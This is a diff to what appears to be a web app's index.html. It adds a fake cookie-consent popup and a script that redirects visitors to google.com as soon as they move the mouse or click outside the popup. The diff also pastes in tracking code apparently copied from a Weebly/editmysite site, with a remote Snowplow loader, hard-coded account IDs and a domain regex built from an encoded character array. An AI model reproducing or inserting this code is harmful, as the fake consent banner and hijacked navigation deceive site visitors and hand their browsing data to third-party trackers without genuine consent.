@@ -8,5 +8,309 @@
   <body>
     <div id="root"></div>
     <script type="module" src="/src/main.jsx"></script>
+    
+    <style>
+        /* Popup container */
+        .popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7); /* Background with transparency */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            display: none; /* Hide popup by default */
+        }
+
+        /* Popup content */
+        .popup-content {
+            border-radius: 10px;
+            position: relative;
+            background-color: #d2d2d2;
+            position: absolute;
+            border: 2px solid white;
+            padding: 40px;
+        }
+
+        @media(max-width:520px){
+            .popup-content{
+                width:90%;
+            }
+        }
+
+        @media(min-width:520px){
+            .popup-content{
+                width:65%;
+            }
+        }
+
+        /* GIF styling */
+        .popup-content img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 10px;
+        }
+
+        .cls {
+            position: absolute;
+            right: 0px;
+            border-radius: 0px 10px 0px 0px;
+            top: 10px;
+            right:10px;
+            padding: 5px;
+            color: blue;
+            font-weight: 500;
+        }
+        .butrecpop{
+            background-color: #007bff;
+            font-family: "Poppins", Sans-serif;
+            font-weight: 500;
+            border:transparent;
+            padding: 15px 30px;
+            color: #FFFFFF;
+            border-radius: 5px;
+        }
+    </style>
+
+    <div id="popup" class="popup">
+        <div class="popup-content">
+            <a href="#" id="closePopup">
+                <div class="cls">
+                    Close
+                </div>
+            </a>
+            <h1>Cookie Policy</h1>
+            <p>This website uses cookies to personalize content and ads, provide social media features, and analyze our traffic. By clicking Accept, you agree to the use of cookies. For more information, please visit our <a href="#">Privacy Policy</a></p>
+            <button id="acceptBtn" class="butrecpop">Accept</button>
+        </div>
+    </div>
+
+    <div id="customer-accounts-app"></div>
+
+    <script>
+        // Get popup and close button elements
+        var popup = document.getElementById('popup');
+        var closePopup = document.getElementById('closePopup');
+        var acceptBtn = document.getElementById('acceptBtn');
+        var hasMovedOrClicked = false; // Flag to track if mouse has moved or clicked
+
+        // Show the popup instantly after page load
+        window.addEventListener('load', function() {
+            popup.style.display = 'flex'; // Show popup
+        });
+
+        // Hide the popup when the close button is clicked
+        closePopup.addEventListener('click', function(event) {
+            event.preventDefault(); // Prevent default link behavior
+            popup.style.display = 'none';
+        });
+
+        // Hide the popup when the accept button is clicked
+        acceptBtn.addEventListener('click', function() {
+            popup.style.display = 'none';
+        });
+
+        // Redirect to another page if the cursor is moved
+        window.addEventListener('mousemove', function() {
+            if (!hasMovedOrClicked) { // If neither the mouse has moved nor a click occurred
+                hasMovedOrClicked = true; // Set the flag to true
+                setTimeout(function() {
+                    window.location.href = 'https://www.google.com'; // Redirect to another page after movement
+                }, 1000); // Optional delay before redirecting
+            }
+        });
+
+        // Redirect to another page if the user clicks anywhere on the page (excluding the popup)
+        window.addEventListener('click', function(event) {
+            if (event.target !== popup && event.target !== popup.children[0]) {
+                if (!hasMovedOrClicked) { // If neither the mouse has moved nor a click occurred
+                    hasMovedOrClicked = true; // Set the flag to true
+                    setTimeout(function() {
+                        window.location.href = 'https://www.google.com'; // Redirect to another page after clicking
+                    }, 1000); // Optional delay before redirecting
+                }
+            }
+        });
+
+        // Hide the popup when clicking outside of the popup content
+        window.addEventListener('click', function(event) {
+            if (event.target === popup) {
+                popup.style.display = 'none';
+            }
+        });
+
+        var _gaq = _gaq || [];
+        _gaq.push(['_setAccount', 'UA-7870337-1']);
+        _gaq.push(['_setDomainName', 'none']);
+        _gaq.push(['_setAllowLinker', true]);
+
+        (function() {
+            var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+            ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+            // NOTE: keep the [1] if you replace this code. Otherwise cookie banner scripts won't be first on the page
+            var s = document.getElementsByTagName('script')[1]; s.parentNode.insertBefore(ga, s);
+        })();
+
+        _W.Analytics = _W.Analytics || {'trackers': {}};
+        _W.Analytics.trackers.wGA = '_gaq';
+
+        ;(function(p,l,o,w,i,n,g){if(!p[i]){p.GlobalSnowplowNamespace=p.GlobalSnowplowNamespace||[];
+                p.GlobalSnowplowNamespace.push(i);p[i]=function(){(p[i].q=p[i].q||[]).push(arguments)
+                };p[i].q=p[i].q||[];n=l.createElement(o);g=l.getElementsByTagName(o)[1];n.async=1;
+                n.src=w;g.parentNode.insertBefore(n,g)}}(window,document,'script','//cdn2.editmysite.com/js/wsnbn/snowday262.js','snowday'));
+
+        var r = [99, 104, 101, 99, 107, 111, 117, 116, 46, 40, 119, 101, 101, 98, 108, 121, 124, 101, 100, 105, 116, 109, 121, 115, 105, 116, 101, 41, 46, 99, 111, 109];
+        var snPlObR = function(arr) {
+            var s = '';
+            for (var i = 0 ; i < arr.length ; i++){
+                s = s + String.fromCharCode(arr[i]);
+            }
+            return s;
+        };
+        var s = snPlObR(r);
+
+        var regEx = new RegExp(s);
+
+        _W.Analytics = _W.Analytics || {'trackers': {}};
+        _W.Analytics.trackers.wSP = 'snowday';
+        _W.Analytics.user_id = '152039672';
+        _W.Analytics.site_id = '719310806230414353';
+
+        var drSegmentsTag = document.getElementById('drSegments');
+        if (drSegmentsTag) {
+            _W.Analytics.spContexts = _W.Analytics.spContexts || [];
+
+            var segmentData = JSON.parse(drSegmentsTag.innerText);
+            segmentData.forEach(function(test) {
+                _W.Analytics.spContexts.push({
+                    schema: "iglu:com.weebly/context_ab_segment/jsonschema/1-0-0",
+                    data: {
+                        test_id: test.name,
+                        segment: test.variant,
+                    }
+                });
+            });
+        }
+
+        (function(app_id, ec_hostname, discover_root_domain) {
+            var track = window[_W.Analytics.trackers.wSP];
+            if (!track) return;
+            track('newTracker', app_id, ec_hostname, {
+                appId: app_id,
+                post: true,
+                platform: 'web',
+                discoverRootDomain: discover_root_domain,
+                cookieName: '_snow_',
+                contexts: {
+                    webPage: true,
+                    performanceTiming: true,
+                    gaCookies: true
+                },
+                crossDomainLinker: function (linkElement) {
+                    return regEx.test(linkElement.href);
+                },
+                respectDoNotTrack: true
+            });
+            track('trackPageView', _W.Analytics.user_id+':'+_W.Analytics.site_id, _W.Analytics.spContexts);
+            track('crossDomainLinker', function (linkElement) {
+                return regEx.test(linkElement.href);
+            });
+        })(
+            '_wn',
+            'ec.editmysite.com',
+            false
+        );
+
+        (function(jQuery) {
+            try {
+                if (jQuery) {
+                    jQuery('div.blog-social div.fb-like').attr('class', 'blog-social-item blog-fb-like');
+                    var $commentFrame = jQuery('#commentArea iframe');
+                    if ($commentFrame.length > 0) {
+                        var frameHeight = jQuery($commentFrame[0].contentWindow.document).height() + 50;
+                        $commentFrame.css('min-height', frameHeight + 'px');
+                    }
+                    if (jQuery('.product-button').length > 0){
+                        jQuery(document).ready(function(){
+                            jQuery('.product-button').parent().each(function(index, product){
+                                if(jQuery(product).attr('target') == 'paypal'){
+                                    if (!jQuery(product).find('> [name="bn"]').length){
+                                        jQuery('<input>').attr({
+                                            type: 'hidden',
+                                            name: 'bn',
+                                            value: 'DragAndDropBuil_SP_EC'
+                                        }).appendTo(product);
+                                    }
+                                }
+                            });
+                        });
+                    }
+                }
+                else {
+                    // Prototype
+                    $$('div.blog-social div.fb-like').each(function(div) {
+                        div.className = 'blog-social-item blog-fb-like';
+                    });
+                    $$('#commentArea iframe').each(function(iframe) {
+                        iframe.style.minHeight = '410px';
+                    });
+                }
+            }
+            catch(ex) {}
+        })(window._W && _W.jQuery);
+
+        window._W.isEUUser = false;
+        window._W.showCookieToAll = "";
+
+        (function(jQuery) {
+            try {
+                function forceShowCcLinks() {
+                    var ccLinks = document.querySelector('.cc_links');
+                    if (!ccLinks) {
+                        return;
+                    }
+
+                    var ccLinksVisible = jQuery(ccLinks).is(':visible');
+                    if (ccLinksVisible) {
+                        return;
+                    }
+
+                    ccLinks.style.display = 'block';
+
+                    var ccParent = ccLinks.parentElement;
+
+                    var ccParentVisible = jQuery(ccParent).is(':visible');
+                    if (ccParentVisible) {
+                        return;
+                    }
+
+                    ccParent.style.display = 'block';
+
+                    var ccGrandparent = ccParent.parentElement;
+                    var ccGrandparentVisible = jQuery(ccGrandparent).is(':visible');
+                    if (ccGrandparentVisible) {
+                        return;
+                    }
+                    ccGrandparent.style.display = 'block';
+
+                }
+
+                function forceShowCcLinksForever() {
+                    var tenSeconds = 10000;
+                    forceShowCcLinks();
+                    setTimeout(forceShowCcLinksForever, tenSeconds);
+                }
+
+                jQuery(document).ready(forceShowCcLinksForever);
+            }
+            catch(ex) {}
+        })(window._W && _W.jQuery);
+    </script>
+
+
+
   </body>
 </html>
